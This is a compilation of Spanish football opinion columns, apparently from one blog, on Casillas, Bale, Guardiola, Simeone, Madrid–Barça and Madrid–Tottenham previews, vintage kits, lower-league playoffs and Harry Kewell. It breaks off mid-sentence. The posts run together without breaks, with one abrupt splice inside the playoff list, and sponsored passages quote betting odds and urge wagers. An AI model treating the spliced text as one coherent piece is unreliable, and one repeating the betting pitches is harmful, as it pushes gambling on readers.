Pues eso. Casillas está fallando más de lo normal. El que durante un tiempo pareció inducir al consenso sobre la identidad del mejor portero del mundo, salvador de la patria en Sudáfrica y afortunado -o intuitivo- como pocos cuando el mundo se para alrededor de un balón y la red que lo espera, lleva dos meses convertido en el eslabón más débil de un Madrid dubitativo. Algunos fallos groseros, el miedo a la salida que nunca ha acabado de irse del todo, y una sensación de inseguridad que hace temblar a la estupenda línea de centrales que constituye la anterior barrera de defensa, han sembrado en el madridismo una cierta preocupación hacia el que durante años se ha mostrado como uno de sus grandes baluartes. No pasa el Santo su mejor momento, y no está mal que se hable de ello.Sin embargo, desde hace algún tiempo, el capitán del Madrid vive sometido a un nivel de crítica tan elevado como injustificado desde el punto de vista deportivo. El acoso y derribo llega desde dos sectores “ideológicamente” opuestos, y procede tanto de cierto sector de la grada y la afición, por un lado, como de una parte de los medios de comunicación, por otro.De todos es sabido que hay una fracción muy importante del madridismo -y en particular, del público que suele acudir al Bernabéu- que respalda a Mourinho de un modo que se puede considerar acrítico.En general, se trata del personal que no ve mal el dedo en el ojo, las críticas desaforadas a los árbitros y algunas otras lindezas que deploran incluso muchos de los que consideran al portugués una presencia positiva para el Madrid. Para esta parte de la afición, algunos gestos en los que Casillas se ha apartado de la línea “oficial” significan una traición para el liderazgo del entrenador y, por extensión, para el club blanco. El resultado es un torrente de injurias que en algunos casos roza lo insultante. Paradójicamente, ese enfrentamiento con Mourinho, que muchos no sabemos hasta qué punto es real o inventado, ha dado lugar a que el portero de Móstoles haya recibido también dardos desde el otro lado como una manera de atacar el club y al entrenador. Sin llegar al nivel de infamia de la portada electrónica de Sport de ayer -preguntaba si Iker se había dejado marcar para perjudicar al entrenador- se comenta que Iker no está a gusto, que no soporta la situación, y que incluso se plantearía irse. Todo con el objetivo de mostrar como el demonio portugués no respeta nada en sus deleznables ambiciones autocráticas, ni siquiera a uno de los más grandes mitos que se han puesto la camiseta del Madrid.Aparte de que cuesta creer que si un entrenador -más del carácter de Mourinho- está realmente a disgusto con un jugador lo ponga siempre de titular, la impresión que da todo esto es de una pugna descomunal que tiene el control del club como objetivo, y que ha convertido al capitán blanco en un involuntario muñeco de pim-pam-pum. Podríamos hablar de la montaña de títulos, distinciones y milagros que avalan la trayectoria de Casillas y desnudan el sinsentido de estas críticas, pero por ir terminando y zanjando la cuestión, sólo recomendaremos a los adalides del fuego cruzado que recuerden dos nombres: Leverkusen, si son madridistas, y Robben, si no lo son. Debería ser suficiente. Ha quedado un poco como ejemplo de la eterna desventura de la selección española en los Mundiales. La Roja había empezado su andadura en Argentina ‘78 perdiendo (como casi siempre) ante Austria, y necesitaba ganar a Brasil para no depender de sí misma en el partido definitivo. Con cero a cero en el marcador, un rechace deja el balón a los pies de Julio Cardeñosa, que se ve en la misma línea del área pequeña, con el balón controlado y sólo el defensa Amaral entre él y la portería, vendido bajo el larguero. Considerando la gran calidad del zurdo pucelano, hemos de pensar que fueron los nervios, la responsabilidad o, sencillamente, el mal fario los culpables de que el golpeo resultase infecto, y el balón se estrellase en el zaguero antes de salir despedido. Un terrible error puntual que marcó para siempre el nombre de un gran futbolista –leyenda donde las haya del Real Betis- y que selló el destino de un combinado al que no sirvió de nada la victoria postrera frente a Suecia. Una pena, porque pocas veces fue Brasil tan vulnerable.Lecciones de fútbol como la que dio frente al Inter en la fase de grupos lo señalan como una de las estrellas de mañana. Pero lejos de las individualidades, de la clarividencia de Modric, del oportunismo y creación de Van der Vaart, la contención de Wilson Palacios o el desborde de Pienaar, el Tottenham es un conjunto solidario, eficaz y aguerrido. Las bajas en al defensa pueden mermar esa capacidad de sacrificio táctico, sin Gallas o King el equipo puede ser más blando, por ahí deben entrar las flechas madridistas.Entiendo que Mourinho sacará a sus hombres revolucionados. No queda otra. Aunque en la rueda de prensa haya especulado con el empate, lo cierto es que el Madrid debería tratar de asegurar el pase aquí y no flirtear con el desastre en White Hart Lane. Benzema no jugará así que volverá a recaer el peso goleador sobre un sobrepasado Adebayor. Cristiano está renqueante y Marcelo sigue siendo duda. Tres pilares fundamentales que se notarán, pero que no deberían ser definitivos. Vuelve Alonso, posiblemente estarán Özil y Di María, la defensa de lujo y una confiaza ciega en dominar el juego, no dejar que Crouch haga demasiado el robot en el área y aprovechar las carencias defensivas para atosigar a un buen portero como Gomes. Es decir, el once habitual de este año. Con Kedhira de coche escoba -poco más ha demostrado ser este año- y pendientes de que los de arriba trencen alguna jugada de esas que ponen el corazón encogido a la grada.Tras el réquiem liguero del sábado, nada mejor que acción ante la parroquia merengue para inyectar ilusión a una grada entre la seriedad y el escepticismo. Es una oportunidad inmejorable. En fútbol, cuánto me gusta repetir esto, nunca hay nada ganado pero el Tottenham debe ser víctima de la voracidad de Mourinho. Unas semifinales de Champions serían motivo suficiente para celebrar la temporada, el Madrid debe reconquistar los títulos no a través de la épica sino de la prosa. No tanto con el juego poético sino con la extensa pero certera narrativa. Enterrar el sueño liguero y empezar a creer en el milagro europeo.Estos partidos se prestan, por inciertos, a apuestas de todo tipo. Partamos de las cuotas básicas: la victoria del Madrid se paga a 1,40 € y la del Tottenham a 6,75. El término medio, ese empate del que habló Mourinho en la rueda de prensa dándolo por resultado apetecible, está a 4,50 €. Nada descartable en una ida en la que habrá mucho respeto entre ambos clubes. Como para mí las apuestas son juego y el juego es lúdico, siempre pienso en algún dato algo extraño que nos tenga en vilo durante el encuentro. He pensado en el gol de Adebayor, pero se paga a 2,10 €. Poco misterio. Vamos al tema, Van der Vaart ha dicho que ganarán el partido 0-1 con un gol suyo. Es buen futbolista, ¿y también pitoniso? Su gol se paga a 3,30 € y el 0-1 a 17 €!!! Desde luego, si apostamos y el holandés lo clava, le debemos una pinta de Guiness cerca de su casa. Cada quince días y de la mano de Classic Football Shirts, la tienda online especializada en camisetas antiguas, nos acercamos al fútbol con una perspectiva diferente. Lo hacemos desde las camisetas con las que se ha construido la historia del deporte rey.El 20 de abril, Barcelona y Real Madrid disputarán una final esperada. Los dos equipos más laureados del fútbol español decidirán quién se lleva a sus vitrinas la Copa del Rey. Hace veintiún años, meyba y hummel dirimían los mismos asuntos sobre el césped del Luis Casanova de Valencia. Aquella vez ganó el equipo blaugrana, un gol de Amor y otro de Julio Salinas ajusticiaron al equipo de Toshack. La expulsión de Hierro resultó decisiva y ni siquiera la pareja Butragueño-Hugo Sánchez sirvió para atemorizar la portería sobriamente defendida por ese excelso portero llamado Zubizarreta.Hablamos de dos de las camisetas más representativas de nuestra historia futbolística. Los modistillos podemos recordar esa “m” en el pecho de Bakero, Koeman o Serna. Los genuinos galones de hummel en las mangas de Julio Llorente, Michel o Ruggeri son tan míticos como esas calzonas ceñidas o las negrísimas botas de los futbolistas. Cosa seria la temporada 89/90. Esa final de Copa marcó el final de un ciclo victorioso de los merengues y abrió el reinado de Cruyff, ese holandés adusto al que tanto le debe este equipo victorioso de Guardiola.También esa final marcó el final de los ochenta y la entrada en ese oscuro mundo noventil. Kelme y Kappa sembraron el terror en las elásticas de los dos grandes. Se nos fue la sobriedad de meyba, se nos fue el clasicismo de hummel. Vinieron los colores verdosos, naranjas, violetas, ramalazos cubistas, diseños imposibles.Cuando Benzema, Adebayor, Alonso, Villa, Pedrito y Busquets pisen el césped del, tal vez, estadio de Mestalla revivirán en su piel aquella final del 5 de abril del 90. García de Loza silbato en mano, 22 jugadores en busca de un título vistiendo sus mejores galas. Nada que ver con estos inanes diseños de ahora. Con esa nueva camiseta de Nike que parece remedar el horror del Steaua de Bucarest, o esa Adidas simplona que ha perdido el glamour vintage de sus mejores años. Recordemos a Aldana, Aloisio, Zubi, Paco Buyo, Baquero o Gordillo, enfundados en estas elegantes, estrechas y eternas zamarras. Del trabajo sólo he aprendido dos cosas. Primero: tus compañeros son más idiotas y vagos que tú, pero si vas al enfrentamiento, siempre ganarán ellos. Y segundo: tu jefe, en el mejor de los casos, te desprecia y jamás tomará una decisión que te beneficie. Mi solución siempre ha sido sonreír a mis compañeros y no discutir las decisiones de mis superiores, aunque eso me haya llevado al paro. Soy un trabajador dócil, gris y sólo ocasionalmente motivado; que sólo entiende esta movida como un trámite para cobrar dinero que luego gastaré en las cositas luminosas de mi vida: viajar con mi novia, poner el Canal Plus, y pedir al chino los domingos de resaca.Cuando un futbolista se queja de sus compañeros o se enemista con el entrenador o el presidente, siempre pienso que son como yo: oscuros funcionarios en lo suyo. Si yo paso las horas delante del ordenador ellos lo hacen pegando patadas a un balón; pero tanto ellos como yo estamos hechos de lo mismo, de la carne de los asalariados, de la fofa y melancólica materia que llena este mundo de mierda. Los futbolistas a los que llaman “profesionales” son en realidad esas ratitas de oficina que cimentan las entidades, que cumplen en su momento sin alardes y que ven como las medallas se las llevan otros con ternura y un pellizquito de pundonor.Todos hemos tenido nuestras pequeñas revoluciones. Esas salidas del plato michaeldouglescas en días especialmente duros, donde todo va contra ti y resulta que no tienes la culpa de nada y al fin explotas. No sirve de nada y la consecuencia lógica es el fin de tus días en esa empresa. Con la frente alta y los bolsillos vacíos. No pretendo parecer pragmático y mucho menos pesetero, pero sea cual sea tu trabajo, hasta el más ilusionante de todos, chocarás contra la insoportable realidad de los inútiles, la tiranía de los bobos, las organizaciones piramidales, presenciales, lentas e insensibles. Al final tendrás que hacer el trabajo de otros o asumir sus derrotas que terminarán siendo las tuyas.Quiero decir que las grandes empresas se hacen grandes con gente como yo, y que los trabajadores orgullosos autoconscientes y estandartes del derecho laboral engrosan, más que ningún otro, las listas del paro. Y obviamente, estoy hablando de Gareth Bale. El galés es tan bueno como derrotista, tan técnico como respondón. Bale es de esos compañeros con los que nadie quiere desayunar, los que minimizan las ventanas del navegador cuando pasas cerca de su escritorio, los que mandan mails al jefe aliviando su culpa y cargándola sobre tu espalda, los que cuando se emborrachan en la comida de empresa te dicen que se habían equivocado contigo y que eres de puta madre y que, una semana después, te la vuelven a meter. Puedes ser importante con menos talento que él y puedes ser prescindible siendo, como él es, un genio del balón.Ahora está lesionando exclusivamente por un pataleo.Quiso jugar un partido intrascendente con Gales para reivindicarse, para que le dijeran en su país lo guapo que es y lo bien que juega. Para darse un homenaje. Olvidó al que le paga y se lanzo a los brazos de lo inane, al aplauso sencillo de los suyos. Como cuando le cuentas tus movidas laborales a tu madre y ella dice que hay que ver con lo que tú vales cómo te tienen así.Su lesión hace daño al Real Madrid. Una cosa es el tontamente llamado “virus FIFA” y otra esto. Su compromiso con el equipo quedó en entredicho en un momento, además, de rupturas en el seno del club. Con el médico, con el entrenador y con otros compañeros. Gareth Bale se comportó como un mal compañero, como un mal asalariado y quizá como un mal profesional. Pese a la alegría desbordante por su clasificación, merecida, ese partido contra Andorra no debió jugarlo. Noventa minutos de nada que ahora cuestan unos minutos de mucho. Otros tendrán que correr por él, defender por él, sacar el trabajo adelante. Otros que sí renunciaron a sus obligaciones o placeres por respeto al club que les paga. No es cuestión de colores, ni de sentimientos, es sólo cuestión de profesionalidad.Gareth Bale llegó al Madrid como una estrella y ahora es sólo un compañero respondón. Cristiano Ronaldo, Benzema o James, con todo lo que pudieran ser, asumen su papel de funcionarios grises al servicio del club. Ellos mantienen la estructura. Viva la melancolía laboral. Leí hace años El Perfume, el one hit wonder del escritor alemán Patrick Süskind. El libro acababa, lamento el spoiler, con el protagonista rociándose por encima el frasco con el mejor aroma posible –fruto de sus experimentos delictivos- y causando entre el pueblo tal atracción que acaba siendo devorado o destrozado o resobado por los asistentes. Más claro, que tal fue el deseo hacia él que sólo pudieron satisfacerlo zampándoselo. No digo que los periodistas vaya a terminar merendándose a Guardiola, pero ayer, mientras zapeaba en duermevela por los programas radiofónicos deportivos de la noche, sólo escuchaba panegíricos, alabanzas, piropos y sonrojantes reflexiones para el cerebro de Santpedor. Y no digo que no lo merezca, es, siendo objetivos, uno de los mejores técnicos del mundo, pero los contertulios hacen gárgaras con agua bendita antes de hablar de él, y terminan glosando sus pausas o sus bromas como si Guardiola fuera algo más que un técnico de fútbol, como si fuera la encarnación de un ángel en la tierra, como si fuera Grenouille bañado en perfume, vaya.Muchos de esos periodistas, contertulios, amigos y familiares, son los mismos que se lavan los dientes después de hablar de Laporta. Parecen la piedra negra y la piedra blanca de Lost. Uno representa la virtud y el otro el exceso. Sin embargo, a meses de que el polémico presidente haga sus maletas y abandone definitivamente la casa blaugrana, creo que sería justo reconocer que el Barcelona es algo más que un entrenador osado. El Barça ha sido el ejemplo de un club adaptado a la modernidad, vanguardista, y merecedor del status en el que ahora se encuentra. Creo que Laporta, o su equipo para no personalizar el éxito, ha conseguido dotar a la entidad de unas estructuras a prueba de bombas. Antes de llegar Guardiola el equipo sabía mover la pelota, era capaz de vencer brillantemente en Liga y alcanzar su primera Champions post-Koeman, aquella bonita final con Henry, Belletti y el Arsenal. Pese al declive de un entrenador clave en este proyecto como fue Rikjaard, y con él sus estrellas –Ronnie, Deco-, el club supo rearmarse y lo hizo de una manera valiente y arriesgada, dando el timón del primer equipo a un bisoño exjugador metido a técnico cuya experiencia pasaba por entrenar al filial en 3ª, al López Caro culé. Nadie daba demasiado por él, y la jugada parecía más un delirio laportista que un planteamiento de futuro. El tiempo dio la razón a la Junta Directiva y encumbró, sin ningún tipo de sombra, a Pep Guardiola.Lo cierto es que en estos años de mandato, superando el zigzagueante periodo postrero de Núñez y el ilógico de Gaspart, el club barcelonés ha logrado alcanzar las cotas más altas desde que son un club de fútbol. Y ha llovido ya. Guardiola es una pieza fundamental, pero muchas de las virtudes que se le conceden no son tanto exclusivas de su periodo al frente de la plantilla, sino principios inherentes al club. Ya había canteranos brillantes con el holandés que le precedió en el cargo. También la apuesta por el juego de toque, por ese 4-3-3 letal, por los jugadores técnicos frente a la brega todocampista. El 4 del Barça ha sabido agitar los ingredientes y ser el continuador de un ciclo que, con sus pequeños altibajos, ha asombrado a Europa y ha sido bautizado, creo que merecidamente, como el mejor equipo de la historia.Reinventado  a Monterroso, cuando Guardiola despertó Messi ya estaba allí. Y Xavi, y Valdés, y Bojan, y un bloque virtuoso que solo puede producir una entidad bien engrasada, elaborada, un proyecto magistral respetado pese a las injerencias externas, y que hoy, con Guardiola de recolector, mete en un enorme canasto sus frutos. Ayer, mientras escuchaba a los contertulios aplaudir hasta el color de zapatos de Guardiola, pensé lo superficial que puede ser el fútbol cuando no miramos con profundidad las cosas. Yo no creo en los milagros, sí en el trabajo. No me queda otra que alabar la gestión de un club, modélica gestión, y dejaré el resto de lisonjas para cuando no tenga ganas de hablar de fútbol. Dudo que al mediático entrenador, por lo que le he leído antes, le conmueva todo este grupo palmero. Es un genio humilde. Guardiola es, para bien del barcelonismo, el producto perfecto de una maquina idílica. No es el artífice, es el artificio. Eso no le resta mérito, pero si divide el mérito entre los demás. Todo gran equipo necesita un gran central. El kaiser, el guardián del área, el jugador sobrio y expeditivo que anula a los delanteros rivales, que despeja cada balón que osa acercarse a sus proximidades. La máxima dice: los delanteros ganan partidos, las defensas ganan campeonatos. El zaguero, ese hombre. Hablar de Spasic es hablar de una incognita con piernas, de un futbolista incomprendido. Marcó donde más duele como más duele, en el clásico en su propia meta. El cavó el agujero donde cayeron después  Mejía, Pavón, Samuel, Campo o Woodgate. Partizan, Real Madrid, Osasuna y Atlético Marbella, partidos para la historia. Un recuerdo para Predrag, el yugoslavo impenetrable, un recuerdo para Jaro, un recuerdo también para Salinas. Cada semana, de la mano de Betfair.com, os ofreceremos el análisis de los partidos más interesantes del fútbol europeo.Las grandes historias se escriben en minúsculas.Los grandes partidos se deciden por los pequeños detalles. Nada más impredecible que un Madrid-Barça. Hay argumentos a favor de los dos equipos, una temporada aplastante en la competición doméstica, rueda con rueda, puntuando semana tras semana y demostrando que, más allá del presupuesto, su apuesta por el fútbol directo es garantía de espectáculo. Ya no vale el uno por uno, ambos equipos han demostrado ser bloques compactos, sólidos, fuertes en casa y osados fuera. Setenta y siete puntos son la medida justa de un fútbol arrollador, inmisericorde, distanciado del pelotón de perseguidores, una bicefalia que hacía años que no eran tan palpable en nuestro fútbol. Por eso el partido de mañana es algo más que un partido y, lejos de los tópicos de cada año, será decisivo para el desenlace final del campeonato. Cualquier pronóstico es posible, será un choque abierto, alternativo, ofensivo como Guardiola ha predicho. Los tres puntos serán fundamentales para alzar el trofeo al final de temporada.Hablar de bajas en dos plantillas tan lustrosas como las que entran en juego el sábado es una frivolidad. Sin Ibrahimovic y sin Kaká no son menos equipo. Al sueco puede suplirle un intermitente Bojan y al apagado brasileño lo lleva sustituyendo con eficacia Van der Vaart. El duelo se decidirá entre los dos mejores futbolistas del momento, ambos disponibles y al cien por cien en este momento, Messi y Cristiano Ronaldo. La individualidad brillante frente a la colectividad, dos jugadores que no necesitan el apoyo de ningún compañero para convertir en gol cualquier balón que pase por sus pies. El espectáculo pasa por sus botas. Cristiano ya ha desafiado con llevarse el balón tras el partido. Messi lo lleva haciendo en los últimos choques. Lejos del ego puesto en liza, son dos piezas fundamentales en la arquitectura de sus equipos. Todo el discurso ofensivo pasa por las diagonales de dos extremos convertidos en delanteros, de su claridad y regate nacerán los goles.Aunque el Barcelona disfruta meciendo el balón en las zonas templadas del campo, el de mañana será un partido incómodo para ellos. El Madrid saldrá a morder, no queda otra jugando en casa ante el rival eterno. La presión a la zona defensiva será fundamental para emborronar la creación azulgrana. Higuaín se desvivirá por cortar la fluidez automatizada de los hombres de Guardiola. En esa labor será imprescindible Xabi Alonso, hecho ya a los partidos de brega en el mediocampo, y también Lass. Pese al resurgir de Gago creo que el francés se adaptaría mejor a la función de mañana. Si el mecanismo suizo del Barcelona no falla el equipo es imparable, la destrucción y el alboroto en las inmediaciones de Xavi pueden ser esenciales para desarticular un argumento casi inapelable.Tengo claro que el encuentro de mañana no será un partido de medias tintas. Hay demasiado en juego. Más allá de la rivalidad innegable, conseguir la victoria en el Bernabéu acabaría con la moral del contrario. Demasiada presión, sin perdón para los fallos, igualados en todo salvo en la forma de conseguir los puntos. El Real Madrid suscrito a la épica y el Barcelona con la apisonadora acostumbrada. De la concentración de la defensa y el acierto de los delanteros saldrá el vencedor de un partido que puede valer una Liga. Una competición jugada en dos carriles, por dos equipos enfermizamente igualados que mañana tendrán la oportunidad de dejar atrás la sombra que les sigue desde septiembre.La victoria del Madrid cotiza en betfair.com a 2.64 €. La del Barcelona, pese a jugar fuera de casa, está muy cerca, a 2.82 €. El empate, que no es improbable pese a lo que hay en juego cotiza a 3.7 €. Si jugamos a adivinar el marcador es muy jugoso el 0-0 a 23 €, en un extremo, o el 3-3 –resultado nada desorbitado teniendo en cuenta los registros goleadores de ambos equipos- que cotiza a 46 € y puede ser una apuesta tan arriesgada como exitosa. La historia de amor más bonita del mundo está en una película de Disney llamada “El libro de la Selva”. Mowgli, el protagonista, lucha por su vida en la jungla. Se enfrenta al abandono siendo bebé, a una serpiente hipnótica, a un tigre sin compasión, a un mono chiflado… y logra sobrevivir en parte gracias a la ayuda de un oso y una pantera que le acompañan en su disparatado viaje. Los amigos, inesperados y valientes, arropan la irresponsable candidez de Mowgli y a punto están de morir por ese niño estúpido sin más afán en la vida que seguir respirando más o menos feliz.Cuando todo ha acabado, cuando ya los males han sido vencidos, cuando la amenaza deja sitio solo a la luz –que se abre a través de una selva inhóspita-, y Mowgli, Bagheera y Baloo parecen disfrutar de días de reposo y diversión; una niña se cruza en el camino. Mowgli la mira con fascinación y algo parecido a amor. Un amor embrionario, esquivo y desconocido. Un amor que nada tiene que ver con la amistad que siente hacia sus protectores o hacia los lobos que lo criaron. Un amor diferente, absurdo e incontrolable.Ante la mirada complaciente y adulta de la pantera y el oso, Mowgli se va tras la niña sin mirar atrás. Deja su vida, sus circunstancias, su pasado, su lucha por la supervivencia, su lealtad y empieza a perseguir un sueño futuro, improbable aún, lejano, tan seductor como insondable. El amor, las ganas de alcanzar algo que no se tiene, lejos del peligro del pasado, lejos de la angustia de la supervivencia, en un nuevo estado dorado o aún más brillante.Me acuerdo de Mowgli, tan ingenuo y embelesado, cuando veo el sorteo de los playoffs de ascenso a Segunda y Segunda B. También porque hablo con mis compañeros de DDF, Sergio Cortina –y su Oviedo– y Enrique Ballester –con el Castellón-, y veo en sus ojos ese brillo infantil del personaje de Disney. La historia original de Kipling, en la que se basa la novela, es menos dulce que la adaptación en dibujos animados. Hay más muerte y dolor. Es una historia menos honrosa, más salvaje y dura. Creo que la Tercera y la Segunda B tienen más del autor británico que de la factoría de Walt.Es muy difícil abandonar esa jungla infrafutbolera. No hay tigres, pero casi. Ese río que en la película marca la diferencia entre la selva y la humanidad se presenta en las dos próximas semanas. Empiezan los playoffs de ascenso. Suerte a todos los clubes. Hay una historia de amor en cada eliminatoria. De amor a un club al que seguimos, ingenuamente, hacia un sitio mejor. ASCENSO A SEGUNDAPrimeros contra Primeros:Real Oviedo-CádizHuesca-Nastic Segundos contra Cuartos:Logroñés-Huracán ValenciaHércules-Real MurciaUCAM Murcia-Real UniónVillanovense-Athletic B Terceros contra Terceros:Almería B-GuadalajaraRácing Ferrol-Reus Deportivo DESCENSO A TERCERAReal Avilés-EldenseCartagena-Las Palmas Atlético ASCENSO A SEGUNDA BPrimeros contra Primeros:Portugalete-Talavera de la ReinaEbro-VareaPeña Sport-FormenteraMérida-LaredoMensajero-PontevedraLinares-CastellónCondal-Rayo MajadahondaArandina-AlgecirasAscó-Jumilla Segundos contra Cuartos:Osasuna B-Atlético MalagueñoSporting San José-AD San JuanDurango-Deportivo BHaro-CaudalGimnástica Segoviana-CalahorraMartos-AlmansaManzanares-LanzaroteBadajoz-Real Murcia ImperialOntinyent-San FernandoTuilla – Pobla MafumetTarazona-Atlético LevanteAguilas-GimnásticaMercadal-GernikaFigueres-Numancia BCayón-NavalcarneroUnión Adarve-LlosetenseChoco-ExtremaduraAt.Y que la esperanza de un histórico partido de vuelta en San Mamés (primer encuentro con el aforo del nuevo estadio por fin completado) sea suficiente para sortear la erupción de San Paolo.Puedes encontrar camisetas del Napoli en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Javi Guerra. Quizá los goles del malagueño en Vallecas estén pasando más desapercibidos de lo que deberían. En esta jornada, otros dos ante el Granada para colocar a su equipo con cuatro victorias y situarse solo un gol por debajo de Neymar en los alto de la clasificación de máximos goleadores. Un funcionario del gol. Un especialista en rendir en situaciones delicadas. Tiene pocas, aprovecha casi todas.Neymar Jr. Lo del brasileño contra el Villarreal fue la confirmación de que, hoy por hoy y en ausencia de su ilustrísimo compañero de delantera, es el futbolista más resolutivo de nuestra Liga. Le queda muy lejos ya lo de Júnior, porque Neymar ha crecido en este último mes casi tanto como en toda la pasada campaña. Su sociedad con Suárez es de sobresaliente.Dani Parejo. Hacía tiempo que Valencia no gozaba de una alegría y el sábado pudo desquitarse por obra y gracia de Paco Alcácer y, sobre todo, Dani Parejo. El mediapunta de Coslada firmó una actuación que por fin recordó a sus mejores momentos de la temporada pasada. Con Parejo a buen nivel, Nuno tiene un motivo menos para preocuparse. Futbolista sin sustituto en Mestalla. El que de verdad puede volver a hacer carburar al Valencia.Sergi Enrich. Llegó a Éibar siendo uno de los delanteros más cotizados de Segunda división. Quizá algo eclipsado por el magnífico rendimiento de su compañero Borja Bastón (otro que llegó de Segunda para quedarse y triunfar), sus primeras semanas en Ipurúa fueron algo discretas. Tanto fue así, que perdió la titularidad. Esta semana, en su vuelta al once, el punta de Ciutadella por fin se pudo estrenar como goleador en la máxima categoría. Y fue con doblete.Kiko Casilla. El suplente de Keylor, todo hay que decirlo, tuvo mala suerte. Jugar en el Ramón Sánchez Pizjuán nunca es sencillo. Puntualizado el detalle del escenario, su actuación ante el Sevilla arroja un buen puñado de dudas sobre la portería madridista. Inseguro por alto y escasamente dominador, la inactividad ha hecho muchísima mella en su habitual confianza. No debe ser sencillo pasar de ser un pilar básico en su anterior equipo a aparecer como un simple figurante, como una cara más en el póster de estrellas madridistas. Se ha puesto de evidencia que si no está Keylor, el Madrid tiene un problema. Y esa es la peor de las noticias para Casilla. ‘No me gusta buscar excusas. Nos alegra porque somos Premium, jugamos a las cuatro y en China nos ven…‘. Las ironías que dispara Simeone son tan finas como el juego que desplegaba en la medular en sus años mozos. Tras caer derrotado el pasado sábado en El Molinón, el técnico del Atlético de Madrid quiso poner el dedo en una llaga que se empeña en seguir infectando en cuanto tiene la más mínima oportunidad. Se quejó de que la LFP no hace nada por aliviar el saturado calendario colchonero, condicionado por el partido del martes ante el PSV Eindhoven. Se quejó sibilinamente de que, en similitud de condiciones, otros equipos gozan de algunas horas más de descanso y de un trato más condescendiente. Y su queja es lícita, si él entiende que es la mejor manera de encauzar los intereses de su equipo, por mucho que los suyos gozasen exactamente de las mismas horas de descanso tras su compromiso europeo que, por ejemplo, el FC Barcelona. Sin embargo, y por el modo de practicarla, entiendo que el técnico colchonero tenía mayor interés en que su entorno, tanto aficionados, como directiva o jugadores, fuera consciente de que la queja iba a formularse que en el contenido de la propia queja, que muy probablemente él mismo entendía inútil. Porque Simeone eludió los cauces oficiales, mucho más discretos que la rueda de prensa posterior a una derrota.Quizá, como decía, consciente de su inutilidad, no formuló su protesta por escrito y con registro de entrada en la sede de la LFP. Lo hizo con el volumen del altavoz a tope y cuando todos los focos le iluminaban, como una maniobra más dentro de su estrategia para defender los intereses de su equipo. Porque no solo es importante dar la cara, también lo es que quienes deben confiar en ti sepan que estás continuamente partiéndotela por ellos.El problema de Simeone es que ha tomado por agotadora costumbre algo que debería de ser anecdótico. Y lo ha hecho porque, como es lógico, su afición lo ve con buenos ojos. Ha convertido las ruedas de prensa, fiel a su discurso, en un escenario hostil. En un campo de minas del que es difícil salir con vida. Cuando el calendario se aprieta, cuando los compromisos se vuelven definitivos y el ‘partido a partido‘ empieza a perder importancia porque los éxitos se ven por fin cercanos, Simeone afila la lengua y es más Simeone que nunca. El Cholo se hace fuerte, fortísimo, a base de autoconvencerse de que es la diana de todos los estamentos futbolísticos. En la supuesta persecución contra sus intereses cimenta sus virtudes y construye su identidad. Modela una empatía en sus seguidores que se percibe como animadversión en el espejo de sus rivales. Y eso encandila a su legión de defensores, encantados de verse como una temida alternativa maldita ante el poder establecido, y repugna a sus detractores. Es el camino, extenuante, que ha elegido el argentino. El de los extremos. El del ruido ensordecedor. El del aspaviento y el grito gutural. A él parece que le funciona y le va bien. A otros, y que nos hagan el favor de permitirnos tal licencia, nos parece un peligroso exceso. Sin concesiones para la incertidumbre. Sin dar alimento al nerviosismo. El FC Barcelona finiquitó el título del Campeonato Nacional de Liga 2014/15 con su trabajada victoria por un gol a cero en el Vicente Calderón. Lo hizo, además, de la manera en la que acostumbra a hacer las cosas en los últimos tiempos. Una nueva genialidad de Messi, en precisa combinación con Pedro en la frontal del área colchonera, desenredó un partido que parecía embocado al empate. Otro tanto, la confirmación de otro título. La dimensión del argentino es ya inabarcable. No solo es el futbolista más resolutivo del planeta, sino que tiene esa virtud novelesca de aparecer siempre en el momento oportuno para salir en la foto y ser el artífice material de los éxitos de su equipo. Leo es la perfecta personificación del éxito del club.Este título liguero del Barça, el que hace el número veintitrés en su palmarés y el quinto en las últimas siete campañas, tiene para mí un momento clave. Los días que siguieron a la catártica derrota (1-0) en Anoeta frente a la Real Sociedad, cuando apenas se había disputado el primer tercio de la campaña, marcaron el devenir de la temporada. Aquel partido en San Sebastián colocó a Luis Enrique en el disparadero. Más allá de la propia derrota, su imperdonable pecado había sido conceder descanso a Messi y Neymar, dejando a ambos en el banquillo. Algo que tenía una explicación plausible, ya que las dos estrellas acababan de llegar de sus vacaciones navideñas en sus respectivos países, viaje transoceánico incluido, pero que acabó con el técnico azulgrana señalado. ‘Le viene grande el Barça‘, se llegó a leer. Cosas del resultadismo y de la falta de paciencia en unos tiempos en los que los proyectos deportivos no entienden de cocciones lentas. La tensión de aquellos días se llevó por delante a Andoni Zubizarreta, la víctima más débil, e hizo tambalear la silla de Luis Enrique, a quien se le llegó a atribuir desde cierto sector de la prensa una presunta confrontación con Leo Messi.Y ese precisamente fue el gran mérito del técnico asturiano. Fue inteligente con su situación. Superó el bache, hizo oídos sordos a las desproporcionadas críticas, tragó saliva e hizo equipo. Y así, hasta llevar a los suyos a su mejor momento de la temporada, coincidiendo con esas semanas en las que se deciden los títulos y los equipos opositan al recuerdo o al olvido. Este Barça aún en construcción, aún pendiente de afinar ciertos mecanismos, ya tiene su primer gran título. Ya nadie duda de que el traje le sienta a Lucho como anillo al dedo. A Harry Kewell (Sidney, Australia, 1978) la historia le ha tratado con generosidad. Tras una carrera considerablemente prolífica, pocas dudas caben a la hora de considerarle como el más exitoso futbolista australiano de todos los tiempos. En una época en la que ser australiano y jugar al fútbol en Europa era un asunto de exotismo incomparable, Kewell fue, junto con Mark Viduka, el pionero de un desembarco que, sin llegar a ser nunca de carácter masivo, sí que terminó depositando en la vieja Europa a un buen número de futbolistas aussies, primero en Inglaterra y extendiéndose posteriormente al resto del continente.Desde sus comienzos en el Leeds United (con el que debutó en la Premier League con solo 17 años) a finales de la década de los noventa, época que sin duda debe ser destacada como la más brillante de su larga carrera, hasta convertirse en una de las referencias de la selección australiana mundialista, pasando por un Liverpool con el que llegó a convertirse en el primer campeón de Europa procedente de Oceanía, Kewell nunca llegó a gozar del carisma de Tim Cahill, tal vez su sucesor en el trono del fútbol australiano.Tampoco ayudaron las frecuentes lesiones, especialmente en sus cinco temporadas en Anfield. Tras abonar por sus servicios cinco millones de libras a un Leeds al que ya empezaban a asfixiar los problemas económicos, su llegada a Liverpool fue interpretada como una oportunidad de relanzar una carrera que amenazaba con acabar diluyéndose en Elland Road, enrolado en las filas de un equipo que no podría volver a repetir los éxitos del pasado. Pero el australiano no recuperaría nunca el nivel exhibido en la 99/2000 (en la que fue nombrado Jugador Joven del año por la asociación de fútbolistas ingleses). Protagonista en la final de la Liga de Campeones de 2005 (que, para no variar, tuvo que abandonar por lesión) al ser incluido por Rafa Benítez en el once inicial del Liverpool contra todo 